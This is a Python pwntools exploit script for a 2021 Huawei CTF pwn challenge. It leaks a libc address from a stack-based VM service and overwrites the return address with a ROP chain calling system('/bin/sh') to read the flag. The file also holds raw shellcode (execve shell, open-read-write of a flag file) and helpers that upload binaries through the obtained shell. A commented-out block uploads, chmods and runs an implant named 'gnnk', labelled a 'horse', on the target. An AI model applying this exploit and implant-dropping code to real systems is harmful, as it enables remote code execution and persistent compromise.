# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
import binascii
import os
# context.terminal=['tmux','splitw','-h']
context(arch='amd64', os='linux')

ip=sys.argv[1]
port=int(sys.argv[2])
p = remote(ip,port)
libc = ELF('/ctf/2021huaweictf/lib99/libc.so.6')

# sl(fmtstr_pay(start_read_offset,{xxx_got:system_addr}))

one64 = [0xe6c7e,0xe6c81,0xe6c84]

# shellcode = asm(shellcraft.sh())
shell32='\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
shell64='\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
orw32="\x68\x61\x67\x00\x00\x68\x2e\x2f\x66\x6c\x89\xe3\xb9\x00\x00\x00\x00\xb8\x05\x00\x00\x00\xcd\x80\x89\xc3\x89\xe1\xba\x00\x01\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\xbb\x01\x00\x00\x00\x89\xe1\xba\x00\x01\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"
orw64="\x49\xb8\x2e\x2f\x66\x6c\x61\x67\x00\x00\x41\x50\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\x00\x01\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x48\xc7\xc2\x00\x01\x00\x00\xb8\x01\x00\x00\x00\x0f\x05"
open_32="\x90\x90\x90\x90\x90\x90\x90\x90\x68\x00\x00\x00\x40\x5f\x68\x00\x02\x00\x00\x5e\x6a\x07\x5a\x49\xc7\xc2\x22\x00\x00\x00\x4d\x31\xc9\x4d\x31\xc0\x48\xc7\xc0\x09\x00\x00\x00\x0f\x05\x48\x31\xff\x68\x00\x00\x00\x40\x5e\x48\xc7\xc2\x00\x01\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x6a\x23\x68\x08\x00\x00\x40\x48\xcb\x0a"
readwrite_64="\x66\x6c\x61\x67\x00\x00\x00\x00\xbb\x00\x00\x00\x40\x31\xc9\x31\xd2\xb8\x05\x00\x00\x00\xcd\x80\x89\xc1\xbc\x50\x01\x00\x40\x6a\x33\x68\x28\x00\x00\x40\x48\xcb\x48\x89\xcf\x48\xc7\xc6\x00\x01\x00\x40\x48\xc7\xc2\x50\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc6\x00\x01\x00\x40\x48\xc7\xc2\x50\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90"

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(mallocr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))
def get_hex(s):
    st=binascii.b2a_hex(s)
    r=""
    i=0
    while i<len(st):
        r+="\\x"+st[i:i+2]
        i=i+2
    return '\"'+r+'\"'

def upload2(local_path, target_path):
    print "begin upload2"
    f=open(local_path,'rb')
    content=f.read()
    i=0
    while (1):
        begin=i
        end=i+1000
        print begin
        if i+1000>len(content):
            end=len(content)
        cmd=" echo -ne {} >> {}  ".format(get_hex(content[begin:end]), target_path)
        sl(cmd)
        #log.success(cmd)
        i=i+1000
        print(i)
        if end==len(content):
            break  
    print "upload2 over"   

# debug(0x2fc)
def push_stack1(v):
    py = ''
    py += str(0x1)+'\n'
    py += v+'\n'
    return py

def pop_stack1():
    py = ''
    py += str(0x2)+'\n'
    return py

def push_idx_stack2value_stack1(idx):
    py = ''
    py += str(0x3)+'\n'
    py += str(idx)+'\n'
    return py

def pop_stack1value_idx_stack2(idx):
    py = ''
    py += str(0x4)+'\n'
    py += str(idx)+'\n'
    return py

def stack2_idxv1_add_idxv2(idx1,idx2):
    py = ''
    py += str(0x8)+'\n'
    py += str(idx1)+'\n'
    py += str(idx2)+'\n'
    return py

def stack2_idxv1_sub_idxv2(idx1,idx2):
    py = ''
    py += str(0x9)+'\n'
    py += str(idx1)+'\n'
    py += str(idx2)+'\n'
    return py

def stack2_idxv1_imul_idxv2(idx1,idx2):
    py = ''
    py += str(0xa)+'\n'
    py += str(idx1)+'\n'
    py += str(idx2)+'\n'
    return py

def stack2_idxv1_div_idxv2(idx1,idx2):
    py = ''
    py += str(0xb)+'\n'
    py += str(idx1)+'\n'
    py += str(idx2)+'\n'
    return py

def printf_stack2():
    py = ''
    py += str(0xc)+'\n'
    return py
def mov_value_to_idx_stack2(idx,value):
    py = ''
    py += str(0xe)+'\n'
    py += str(idx)+'\n'
    py += str(value)+'\n'
    return py

# debug(0x000000000000CDA)
py = ''
py += push_idx_stack2value_stack1(0x1015)
py += pop_stack1value_idx_stack2(0)
py += printf_stack2()
py += push_idx_stack2value_stack1(0x1016)
py += pop_stack1value_idx_stack2(0)
py += printf_stack2()
py += push_idx_stack2value_stack1(0x101d)
py += pop_stack1value_idx_stack2(0x1015)
py += push_idx_stack2value_stack1(0x101e)
py += pop_stack1value_idx_stack2(0x1016)
py += "done"
sl(py)
libc_addr = 0
addr7 = p.recv(30)
if addr7[0]=="-":
    addr1 = 0xffffffff-int(addr7[1:-5],10)+1
    addr2 = int(addr7[-5:],10)
    libc_addr = (addr2<<32)+addr1-243-libc.sym["__libc_start_main"]
else:
    addr1 = int(addr7[0:-5],10)
    addr2 = int(addr7[-5:],10)
    libc_addr = (addr2<<32)+addr1-243-libc.sym["__libc_start_main"]

print("libc_addr-->"+hex(libc_addr))

pop_rdi_ret = libc_addr + 0x0000000000026b72
system = libc_addr + libc.sym["system"]
binsh = libc_addr + libc.search("/bin/sh\x00").next()

py = ''
py += mov_value_to_idx_stack2(0x1015,pop_rdi_ret&0xffffffff)
py += mov_value_to_idx_stack2(0x1016,(pop_rdi_ret>>32)&0xffffffff)
py += mov_value_to_idx_stack2(0x1017,binsh&0xffffffff)
py += mov_value_to_idx_stack2(0x1018,(binsh>>32)&0xffffffff)
py += mov_value_to_idx_stack2(0x1019,system&0xffffffff)
py += mov_value_to_idx_stack2(0x101a,(system>>32)&0xffffffff)
py += 'done'

sl(py)
sl('cat /flag')
# print("flag{123213213213213}")      
print(p.recvrepeat(1))

class shell_cmd_cla(object):
    def __init__(self, p):

        self.nc = p
    
    def get_shell(self):
        self.nc=exploit(self.ip, self.port)
    
    def exec_cmd(self,cmd):
        self.nc.sendline(cmd)
        return self.nc.recvrepeat(1.5)
        
    def interactive(self):
        self.nc.recvrepeat(0.1)
        self.nc.interactive()    
        
    def upload(self, local_path, target_path):
        print "begin upload"
        f=open(local_path,'r')
        content=f.read()
        b64=base64.b64encode(content)
        i=0
        while (1):
            begin=i
            end=i+1000
            print begin
            if i+1000>len(b64):
                end=len(b64)
            self.nc.sendline('echo -n '+b64[begin:end]+" >>"+target_path)
            #self.nc.recvuntil("$")
            self.nc.recvrepeat(1)
            i=i+1000
            if end==len(b64):
                break   
                
    def get_hex(self,s):
        st=binascii.b2a_hex(s)
        r=""
        i=0
        while i<len(st):
            r+="\\x"+st[i:i+2]
            i=i+2
        return '\"'+r+'\"'
        
    def upload2(self, local_path, target_path):
        print "begin upload2"
        f=open(local_path,'rb')
        content=f.read()
        i=0
        while (1):
            begin=i
            end=i+1000
            print begin
            if i+1000>len(content):
                end=len(content)
            cmd=" echo -ne {} >> {}  ".format(self.get_hex(content[begin:end]), target_path)
            self.nc.sendline(cmd)
            #log.success(cmd)
            i=i+1000
            if end==len(content):
                break  
        print "upload2 over"                     

# p=shell_cmd_cla(p)
# if os.path.exists('./gnnk'):
#     p.exec_cmd("bash")
#     p.exec_cmd('rm /tmp/gnnk')
#     p.upload2("gnnk","/tmp/gnnk")
#     p.exec_cmd("cd /tmp")
#     p.exec_cmd("chmod 777 ./gnnk")
    #p.exec_cmd("./gnnk %s"%sys.argv[1])
"""    
horse_addr = "/home/v1ct0r/桌面/desktop/ctf/trafic_test/traffic_exploit/work/pwn1/success_exps/gnnk"
if os.path.exists(horse_addr):
    sl("bash")
    sl('rm /tmp/gnnk')
    upload2(horse_addr,"/tmp/gnnk")
    sl("cd /tmp")
    sl("chmod 777 ./gnnk")
    sl("./gnnk %s"%sys.argv[1])
#p.interactive()
"""